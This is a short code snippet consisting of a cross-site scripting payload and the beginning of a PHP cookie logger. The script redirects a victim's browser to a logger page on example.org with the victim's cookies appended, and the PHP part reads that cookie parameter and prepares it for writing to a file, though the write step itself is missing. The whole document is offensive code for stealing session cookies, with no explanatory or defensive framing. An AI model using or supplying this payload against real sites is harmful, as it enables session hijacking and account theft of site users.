<script>
	document.location ='http://www.example.org/logger.php?cookie='+ document.cookie
</script>
<?php
	//assign get variable
	$cookie = $_GET['cookie'];

	// Format variable in easily accessible manner
	$info = "$cookie\n\n";

	// Write information to file
	
?>